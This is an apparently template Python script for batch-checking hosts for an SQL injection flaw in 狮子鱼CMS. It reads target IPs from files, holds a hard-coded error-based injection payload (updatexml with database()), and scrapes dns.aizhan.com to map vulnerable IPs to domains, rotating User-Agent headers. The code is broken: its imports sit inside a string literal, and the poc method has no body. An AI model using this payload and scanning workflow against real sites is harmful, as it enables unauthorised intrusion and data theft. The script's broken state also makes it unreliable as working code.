# coding='utf-8'
# author: xxx
# time:xxxx-xx-xx
'''
import random
import os.path
import re
import time
import requests
from bs4 import BeautifulSoup
import urllib3
'''

def title():
    print("---------*漏洞批量验证脚本*---------")
    '''print("----适用于狮子鱼CMS SQL注入检测-----")
    print("作者: A1andNS")
    print("开发时间：2020/08/18")
    print("-------------验证开始--------------")'''


class IPurl:
    file1path = "ipurl.txt"
    file2path = "ip_finished.txt"
    file3path = "vul_url.txt"
    file4path = "ip_reverse.txt"
    file3 = object
    file4 = object
    ipurl_list = []
    ipurl_finished_list = []
    vul_ip_list = []

    def get_ip_url(self):
        if os.path.exists(self.file1path):
            file = open(self.file1path, "r")
            lines = file.readlines()
            for line in lines:
                line = line.strip()
                self.ipurl_list.append(line)
            file.close()

    def get_ip_url_finished(self):
        if os.path.exists(self.file2path):
            file = open(self.file2path, "r")
            lines = file.readlines()
            for line in lines:
                line = line.strip()
                self.ipurl_finished_list.append(line)
            file.close()

    def get_vul_ip(self):
        if os.path.exists(self.file3path):
            file = open(self.file3path, "r")
            lines = file.readlines()
            pattern = re.compile(r"[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}")
            for line in lines:
                try:
                    line = pattern.findall(line.strip())
                    self.vul_ip_list.append(line[0])
                except:
                    pass
            file.close()

    def open_vul_url(self):
        self.file3 = open(self.file3path, "w")

    def write_vul_url(self, data):
        self.file3.write(data + "\n")

    def close_vul_url(self):
        self.file3.close()

    def open_ip_reverse(self):
        self.file4 = open(self.file4path, "w")

    def write_ip_reverse(self, data):
        self.file4.write(data + "\n")

    def close_ip_reverse(self):
        self.file4.close()


class Scanner:
    ip_url = IPurl()
    payload = 'index.php?s=api/goods_detail&goods_id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)'
    headers_list = []

    def get_headers_list(self):
        file = open("headers.txt")
        lines = file.readlines()
        for line in lines:
            line = line.strip()
            self.headers_list.append(line)
        file.close()

    def poc(self):
       # 此处编辑poc
        

class IPReverseTool:
    ip_url = IPurl()
    headers_list = []

    def get_headers_list(self):
        file = open("headers.txt")
        lines = file.readlines()
        for line in lines:
            line = line.strip()
            self.headers_list.append(line)
        file.close()

    def aiZhangReverse(self):
        self.ip_url.get_vul_ip()
        self.ip_url.open_ip_reverse()
        self.get_headers_list()
        for ip in self.ip_url.vul_ip_list:
            result = ip + "=>"
            url = "https://dns.aizhan.com/" + ip + "/"
            i = random.randint(0, 3)
            headers = {
                'User-Agent': self.headers_list[i]
            }
            try:
                # print(url)
                r = requests.get(url=url, headers=headers, timeout=3)
                soup = BeautifulSoup(r.content, "html.parser")
                # print(soup)
                td = soup.find_all(name="td", attrs={"class": "domain"})
                for i in td[1:len(td) - 1]:
                    a = i.a
                    result += " " + str(a['href'])
                print(result)
                self.ip_url.write_ip_reverse(result)
                time.sleep(2)
            except Exception as e:
                # print(e)
                print(ip + " 发生错误")
        self.ip_url.close_ip_reverse()


if __name__ == "__main__":
    title()
    scanner = Scanner()
    scanner.poc()
    ipReverseTool = IPReverseTool()
    ipReverseTool.aiZhangReverse()
